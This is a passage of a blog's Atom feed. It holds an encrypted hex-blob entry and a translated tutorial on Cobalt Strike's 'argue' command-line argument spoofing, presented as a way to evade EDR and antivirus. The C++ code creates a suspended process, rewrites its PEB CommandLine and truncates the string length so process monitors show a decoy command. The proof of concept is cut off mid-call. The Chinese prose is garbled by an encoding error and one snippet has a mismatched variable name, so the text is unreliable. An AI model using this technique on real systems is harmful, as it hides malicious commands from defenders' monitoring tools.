281c1689e870a31da60188145812473b1fbe82503b99a290ee81d8f0ee5c892079970c1f8e4030cc4deb39f38db6aa4146001136ac2d5efe25bc7fbf5c1ff8a2a3fc5b80f78bd5402cafa4c0585e08a03fc1d0ee76643355c85fa6f445981b057499042d2dd388f4b67cf835913e128ebcdcda66b80203299f2287f9ddc737b6acbc7b693c1379ff2a4415407fac8633e9281431be7f40f7d053f577393058aec58a12ca001b57eb564effd4118025db64177ef40a13409535abaa49ce9b3004de1b598cc4d1cea1a9f95b9ea941faec071ab0dc7e0103d698060bfedefba90cae9d01f94f461e406285e1dfdc461f90c25088dae4a36c3a561857b508e8caab0e338fb2ff6b52880ae377c9dfb31bb643566bccad184ca3c1c1f9e04151b4968eab2c32b83516c007d00b9251eeefd809f688bca4d8817fc0e4c9df8b11a890424329f77043e29afd490b4e7921069c7485792844b59841213e969331b6f578ad1776f3d20c7f07a707523bef406e2a83eff8b7b9c4d28491aebc1ed0e2c6bd5dc502ba1a96b67fb8912021709ebea9ed95c1c9ce5f4fdead211633244f6cd7df8a43de9f33096024317bc5cfea577a955817bb5d00d8fcfd8f3d9b07e964db3c17c904f924b85625d0e5ceaafc706da14125a4e739f058d088da3e6ae2d645bf4a750859be18d15a9e2e4c41d28ae41151f210d744be3ee284ff9b93e3235f10a18aa2aef75b8b4a5156315472ca48a53799dabdc92082be0ca6c642106907b5212dc47e0b1aaf86e9ba23c2e5a3eea0471dea10c3c18a0f5d5cc9f7d13c0c3b320b67368d15b2588ab14eeaf38ee8147c5d0d4b982ea528c37afd796f3ce071e250ff7a0b5880bcfe276ae083cb3237e5030650717cc55fbb9586c3195b5a06ee5721d1280b64ff493a958cdec5eb8ef57ddfe10efde7bfe368c6fe94e8a217a0c9a2d21d1bc7a8009442c7a162b7e4485be5e98edea4e8016a85547a4897e4c10f037959d538ee03687e9be7c744e33811a1941a82516e690d399e9ee97e13ba61dad137b87aa298d054424c526a5e401daf0ecfc71cf65c959e125f49779b9ccfbf49fd756d5e0d9fea6cca70304439b1495d095ed0847b2d384316c91b7f140dfebdad4d6e1b2d82b71b50b7413ae3e5351cbc016e4d73b8a618168faef8c458c3260b77affc18ce754b52163d014640309293b79f2921643e700eb581ed8f54e648b22ddecd60dcb05baa54e1b407b09007809c5fc46b7461f6dbbf6c36ef080c866d146053fd83393f89c641bf5ddce0ea2b32fc494d937b1a252f61b0c750dcdf5a960edb1cc50a7b116da68404f83a1ffda4845a1d4126ab0b9c09284935a112805ce3d797b6c63fd3a93d1db35f9d9da47bb3078dfe29bebb74390be5b6621945e5cbe2d60bc31a1464f8b913e9c10c69cc05db9d6e1c167cf30d5467a476e4d05e9bad6e8484a1a206c69b1a2703bace5619ab706ce3223644147b233cd87a5908cef1ef251e51c9a3a938d2a3cc98aeb0ae59feae722cb9bf4eaf9811a5212916c22935700f002b6f74fc7c3815cb5707d6bba40f52ef650a54a3d41a1bcfa1cf779571fca67193b1e2df5ccbeee1a2f74d5470dddf102797604f8cf9dab501b7a52062f038bd58808487ddf8aad1d9d440c307843bb38b12160c36a2a215c567de6a5876f8f96cf87276518051d5435bcbe1df46b818525f014279f089807c4fef7a54bcaaa66cdba346878f277349e256a948abb1d6fc3cb8f60e42fbb2930dc03791558eff34c2f68de1cc6ef01ef864169282f1784b68c91e1a660c2ee5435db66327299def51188b6b4b7a9557cddd40128084b2b2ca5bf04a09764f7eff0091631c1d570675441d61b307a47adf13a633785a583c84e235f3d9199d159f3437002090d421419cc4f89da90cf8366f6be87c32c047a4900fa8044ed8fee3d0d79e3a19f0f0ca7c7d48d34e88647a65a4e651505b5c16629896c8640235f489d3303d2c5a30325095f20f4bf2d398302a0bae06b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
      <category term="Ê∑±‰ø°Êúç" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike Argue ÂéüÁêÜ - ÁøªËØëÊñá</title>
    <link href="https://blog.sari3l.com/posts/c5e878c3/"/>
    <id>https://blog.sari3l.com/posts/c5e878c3/</id>
    <published>2020-08-04T09:26:01.000Z</published>
    <updated>2020-08-04T09:46:29.621Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965212817543.jpg" alt></p><p>Áúã youtube ËßÜÈ¢ë‰ªãÁªçÔºåÊ≠§ÊîªÂáªÂéüÊú¨ÊòØ‰∏∫‰∫ÜÂØπÊäó EDR Ê£ÄÊµãÊàñÂª∂Ëøü AV Êü•ÊùÄÁöÑÊâãÊÆµ</p><p>ÂéüÁêÜÂæàÁÆÄÂçïÔºåÈÄöËøáËÆæÁΩÆCREATE_SUSPENDEDÊåÇËµ∑ËøõÁ®ãÂêØÂä®ÔºåÂÜçÈÄöËøáPEB‰øÆÊîπProcessParameters‰∏≠ÂÆûÈôÖÂ∞ÜË¶ÅÊâßË°åÁöÑÂëΩ‰ª§Â≠óÁ¨¶‰∏≤ÔºåÊúÄÂêéResumeThreadÊÅ¢Â§çËøõÁ®ã ‚Üí ÊöóÂ∫¶Èôà‰ªì</p><p>Âú®ÂÆûÁé∞Êó∂ÔºåÂª∂‰º∏Âá∫Êù•‰∏§‰∏™Â∞èÈóÆÈ¢ò(ÊäÄÂ∑ß)</p><ol><li>Â¶Ç‰ΩïËé∑Âèñ PEB Âπ∂Êõ¥Êñ∞</li><li>ÁªïËøá PEB ÂâØÊú¨Ê£ÄÊµã</li></ol><h2 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h2><pre class=" language-cpp"><code class="language-cpp">BOOL <span class="token function">CreateProcessA</span><span class="token punctuation">(</span>  LPCSTR                lpApplicationName<span class="token punctuation">,</span>  LPSTR                 lpCommandLine<span class="token punctuation">,</span>  LPSECURITY_ATTRIBUTES lpProcessAttributes<span class="token punctuation">,</span>  LPSECURITY_ATTRIBUTES lpThreadAttributes<span class="token punctuation">,</span>  BOOL                  bInheritHandles<span class="token punctuation">,</span>  DWORD                 dwCreationFlags<span class="token punctuation">,</span>  LPVOID                lpEnvironment<span class="token punctuation">,</span>  LPCSTR                lpCurrentDirectory<span class="token punctuation">,</span>  LPSTARTUPINFOA        lpStartupInfo<span class="token punctuation">,</span>  LPPROCESS_INFORMATION lpProcessInformation<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Âú®<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener">CreateProcessA</a>ÂáΩÊï∞‰∏≠Êàë‰ª¨ÂÖ≥Ê≥®Âà∞lpCommandLineÂíådwCreationFlags</p><ul><li>lpCommandLineÔºöË¶ÅÊâßË°åÁöÑÂëΩ‰ª§Ë°å -&gt; ÊòéÈù¢‰∏äË¶ÅÊâßË°åÁöÑÂëΩ‰ª§Ë°å</li><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags" target="_blank" rel="noopener">dwCreationFlags</a>ÔºöÊµÅÁ®ãÂàõÂª∫Ê†áÂøó</li></ul><p>Âú®<code>ÊµÅÁ®ãÂàõÂª∫Ê†áÂøó</code>‰∏≠Â§ö‰∏™Ê†áËÆ∞‰ΩøÁî®<code>|(Êàñ)ËøêÁÆó</code>Âè†Âä†ÔºåÊúâ‰ª•‰∏ãÂá†‰∏™Â∏∏Êï∞ÂÄºÈúÄË¶ÅÂÖ≥Ê≥®</p><table><thead><tr><th>Â∏∏Êï∞/ÂÄº</th><th>ÊèèËø∞</th></tr></thead><tbody><tr><td>CREATE_NEW_CONSOLE<br>0x00000010</td><td>Êñ∞ËøõÁ®ãÂÖ∑Êúâ‰∏Ä‰∏™Êñ∞ÁöÑÊéßÂà∂Âè∞ÔºåËÄå‰∏çÊòØÁªßÊâøÂÖ∂Áà∂Á∫ßÁöÑÊéßÂà∂Âè∞ÔºàÈªòËÆ§Ôºâ„ÄÇÊúâÂÖ≥Êõ¥Â§ö‰ø°ÊÅØÔºåËØ∑ÂèÇËßÅÂàõÂª∫ÊéßÂà∂Âè∞„ÄÇ<br>ËØ•Ê†áÂøó‰∏çËÉΩ‰∏é<strong>DETACHED_PROCESS</strong>‰∏ÄËµ∑‰ΩøÁî®„ÄÇ</td></tr><tr><td>CREATE_NO_WINDOW<br>0x08000000</td><td>ËØ•ËøáÁ®ãÊòØ‰∏Ä‰∏™Ê≤°ÊúâÊéßÂà∂Âè∞Á™óÂè£Âç≥ÂèØËøêË°åÁöÑÊéßÂà∂Âè∞Â∫îÁî®Á®ãÂ∫è„ÄÇÂõ†Ê≠§ÔºåÊú™ËÆæÁΩÆÂ∫îÁî®Á®ãÂ∫èÁöÑÊéßÂà∂Âè∞Âè•ÊüÑ„ÄÇ<br>Â¶ÇÊûúËØ•Â∫îÁî®Á®ãÂ∫è‰∏çÊòØÊéßÂà∂Âè∞Â∫îÁî®Á®ãÂ∫èÔºåÊàñËÄÖ‰∏é<strong>CREATE_NEW_CONSOLE</strong>Êàñ<strong>DETACHED_PROCESS</strong>‰∏ÄËµ∑‰ΩøÁî®ÔºåÂàôÂ∞ÜÂøΩÁï•Ê≠§Ê†áÂøó„ÄÇ</td></tr><tr><td>CREATE_SUSPENDED<br>0x00000004</td><td>Êñ∞ËøõÁ®ãÁöÑ‰∏ªÁ∫øÁ®ãÂú®ÊåÇËµ∑Áä∂ÊÄÅ‰∏ãÂàõÂª∫ÔºåÂπ∂‰∏îÁõ¥Âà∞Ë∞ÉÁî®<strong>ResumeThread</strong>ÂáΩÊï∞ÊâçËøêË°å„ÄÇ</td></tr></tbody></table><p>‰ª•‰∏ãËØïÂõæÂàõÂª∫‰∏Ä‰∏™ËøõÁ®ãÂπ∂ÊåÇËµ∑ÔºåÊàë‰ª¨Êé•‰∏ãÊù•Â∞Ü‰øÆÊîπÊ≠§ËøõÁ®ã</p><pre class=" language-cpp"><code class="language-cpp">STARTUPINFOA si<span class="token punctuation">;</span>PROCESS_INFORMATION pi<span class="token punctuation">;</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token string">"cmd.exe"</span><span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    FALSE<span class="token punctuation">,</span>    CREATE_SUSPENDED <span class="token operator">|</span> CREATE_NEW_CONSOLE<span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token string">"C:\\Windows\\System32\\"</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>    <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h2><p>È¶ñÂÖàÁúãÂú® PEB ÁªìÊûÑÔºåÊàë‰ª¨‰∏ªË¶ÅÂÖ≥Ê≥® ProcessParameters</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _PEB <span class="token punctuation">{</span>  BYTE                          Reserved1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  BYTE                          BeingDebugged<span class="token punctuation">;</span>  BYTE                          Reserved2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         Reserved3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PPEB_LDR_DATA                 Ldr<span class="token punctuation">;</span>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters<span class="token punctuation">;</span>  PVOID                         Reserved4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         AtlThunkSListPtr<span class="token punctuation">;</span>  PVOID                         Reserved5<span class="token punctuation">;</span>  ULONG                         Reserved6<span class="token punctuation">;</span>  PVOID                         Reserved7<span class="token punctuation">;</span>  ULONG                         Reserved8<span class="token punctuation">;</span>  ULONG                         AtlThunkSListPtr32<span class="token punctuation">;</span>  PVOID                         Reserved9<span class="token punctuation">[</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  BYTE                          Reserved10<span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine<span class="token punctuation">;</span>  BYTE                          Reserved11<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         Reserved12<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  ULONG                         SessionId<span class="token punctuation">;</span><span class="token punctuation">}</span> PEB<span class="token punctuation">,</span> <span class="token operator">*</span>PPEB<span class="token punctuation">;</span></code></pre><p>PRTL_USER_PROCESS_PARAMETERS ÁªìÊûÑ‰Ωì</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _RTL_USER_PROCESS_PARAMETERS <span class="token punctuation">{</span>  BYTE           Reserved1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID          Reserved2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  UNICODE_STRING ImagePathName<span class="token punctuation">;</span>  UNICODE_STRING CommandLine<span class="token punctuation">;</span><span class="token punctuation">}</span> RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">,</span> <span class="token operator">*</span>PRTL_USER_PROCESS_PARAMETERS<span class="token punctuation">;</span></code></pre><p>UNICODE_STRING Á±ªÂûãÁªìÊûÑ‰Ωì</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _UNICODE_STRING <span class="token punctuation">{</span>  USHORT Length<span class="token punctuation">;</span>  USHORT MaximumLength<span class="token punctuation">;</span>  PWSTR  Buffer<span class="token punctuation">;</span><span class="token punctuation">}</span> UNICODE_STRING<span class="token punctuation">,</span> <span class="token operator">*</span>PUNICODE_STRING<span class="token punctuation">;</span></code></pre><p>Âú®‰∏äÈù¢ÈÄöËøáÂàõÂª∫Âπ∂ÊåÇËµ∑ËøõÁ®ãÂêéÔºåÊé•‰∏ãÊù•Êàë‰ª¨Â∞ÜÈÄöËøá<a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess" target="_blank" rel="noopener">NtQueryInformationProcess</a>Êù•Ëé∑Âèñ PEB Âú∞ÂùÄÔºåËøô‰∏™ÂáΩÊï∞Êú™ÂÖ¨ÂºÄÊâÄ‰ª•ÈúÄË¶Å<a href="https://docs.microsoft.com/en-us/cpp/build/getprocaddress?view=vs-2019" target="_blank" rel="noopener">GetProcAddress</a>‰ªé DLL ‰∏≠Ê£ÄÁ¥¢Âá∫ÂáΩÊï∞Âú∞ÂùÄ</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span> <span class="token punctuation">(</span><span class="token operator">*</span>NtQueryInformationProcess<span class="token punctuation">)</span><span class="token punctuation">(</span>  IN HANDLE<span class="token punctuation">,</span>  IN PROCESSINFOCLASS<span class="token punctuation">,</span>  OUT PVOID<span class="token punctuation">,</span>  IN ULONG<span class="token punctuation">,</span>  OUT PULONG<span class="token punctuation">)</span><span class="token punctuation">;</span>NtQueryInformationProcess ntip <span class="token operator">=</span> <span class="token punctuation">(</span>NtQueryInformationProcess<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>PROCESS_BASIC_INFORMATION pbi<span class="token punctuation">;</span>DWORD retLen<span class="token punctuation">;</span><span class="token function">ntpi</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>    ProcessBasicInformation<span class="token punctuation">,</span>    <span class="token operator">&amp;</span>pbi<span class="token punctuation">,</span>    <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pbi<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>retLen<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ÈÄöËøá PEB Ê†áËÆ∞ÁöÑÂú∞ÂùÄÔºå‰ΩøÁî®<code>ReadProcessMemory</code>ËØªÂèñÁõÆÊ†áËøõÁ®ãÁöÑ PEB ‰ø°ÊÅØ</p><pre class=" language-cpp"><code class="language-cpp">PEB pebLocal<span class="token punctuation">;</span>BOOL success<span class="token punctuation">;</span>success <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> pbi<span class="token punctuation">.</span>PebBaseAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pebLocal<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PEB<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Ëøõ‰∏ÄÊ≠•Ëé∑ÂèñProcessParametersÁªìÊûÑ‰Ωì‰ø°ÊÅØ</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">readProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> alloc<span class="token punctuation">;</span>    alloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> alloc<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> alloc<span class="token punctuation">;</span><span class="token punctuation">}</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span> parameters<span class="token punctuation">;</span>parameters <span class="token operator">=</span> <span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">readProcessMemory</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>     pebLocal<span class="token punctuation">.</span>ProcessParameters<span class="token punctuation">,</span>     <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Êé•‰∏ãÊù•‰æøÊòØ‰øÆÊîπProcessParameters‰∏≠ÁöÑCommandLineÔºåÂÖ∂ÂØπÂ∫îÁ±ªÂûã‰∏∫UNICODE_STRING</p><pre class=" language-cpp"><code class="language-cpp">BOOL <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> data<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesWritten<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> data<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesWritten<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span>success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>     parameters<span class="token operator">-</span><span class="token operator">></span>CommandLine<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span>     <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>L<span class="token string">"cmd.exe /k dir\0"</span><span class="token punctuation">,</span>     <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="ÁªïËøáPEBÂâØÊú¨Ê£ÄÊµã"><a href="#ÁªïËøáPEBÂâØÊú¨Ê£ÄÊµã" class="headerlink" title="ÁªïËøáPEBÂâØÊú¨Ê£ÄÊµã"></a>ÁªïËøáPEBÂâØÊú¨Ê£ÄÊµã</h2><p>‰ΩúËÄÖÊèêÂà∞Á±ª‰ººProcessExplorerÂ∑•ÂÖ∑‰ºöÊ£ÄÁ¥¢PEBÂâØÊú¨ÔºåÂØºËá¥ÈöêËóèÂèÇÊï∞Â§±Ë¥•ÔºåÊ≥®ÊÑèÂà∞_RTL_USER_PROCESS_PARAMETERS‰∏≠ÁöÑCommandLineÂèÇÊï∞‰∏∫_UNICODE_STRINGÁ±ªÂûã</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _UNICODE_STRING <span class="token punctuation">{</span>  USHORT Length<span class="token punctuation">;</span>  USHORT MaximumLength<span class="token punctuation">;</span>  PWSTR  Buffer<span class="token punctuation">;</span><span class="token punctuation">}</span> UNICODE_STRING<span class="token punctuation">,</span> <span class="token operator">*</span>PUNICODE_STRING<span class="token punctuation">;</span></code></pre><p>ÂΩìËÆæÁΩÆ<code>Length &lt; sizeof(Buffer)</code>Êó∂ÔºåÂØπ‰∫éProcessHackerÂíåProcessExplorerÔºåÈÉΩ‰ºöÁªàÊ≠¢ÊòæÁ§∫LengthÂ≠óËäÇÂêéÈù¢ÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰ΩÜÂêåÊó∂Âπ∂‰∏çÂΩ±ÂìçËøõÁ®ãÁöÑËøêË°å</p><table><thead><tr><th align="center">ProcessExplorer</th><th align="center">ProcessMonitor</th></tr></thead><tbody><tr><td align="center">ÈïøÂ∫¶ÈôêÂà∂</td><td align="center">ÂëΩ‰ª§ÈöêËóè</td></tr><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965291301083.jpg" alt="-w501"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965291123554.jpg" alt="-w638"></td></tr></tbody></table><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;winternl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> CMD_TO_SHOW "powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'"</span><span class="token macro property">#<span class="token directive keyword">define</span> CMD_TO_EXEC L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0"</span><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span>NtQueryInformationProcess2<span class="token punctuation">)</span><span class="token punctuation">(</span>    IN HANDLE<span class="token punctuation">,</span>    IN PROCESSINFOCLASS<span class="token punctuation">,</span>    OUT PVOID<span class="token punctuation">,</span>    IN ULONG<span class="token punctuation">,</span>    OUT PULONG    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">readProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> alloc<span class="token punctuation">;</span>    alloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> alloc<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> alloc<span class="token punctuation">;</span><span class="token punctuation">}</span>BOOL <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> data<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesWritten<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> data<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesWritten<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> canttrustthis<span class="token punctuation">)</span><span class="token punctuation">{</span>    STARTUPINFOA si<span class="token punctuation">;</span>    PROCESS_INFORMATION pi<span class="token punctuation">;</span>    CONTEXT context<span class="token punctuation">;</span>    BOOL success<span class="token punctuation">;</span>    PROCESS_BASIC_INFORMATION pbi<span class="token punctuation">;</span>    DWORD retLen<span class="token punctuation">;</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    PEB pebLocal<span class="token punctuation">;</span>    RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span> parameters<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Argument Spoofing Example by @_xpn_\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Start process suspended</span>    success <span class="token operator">=</span> <span class="token function">CreateProcessA</span><span class="token punctuation">(</span>   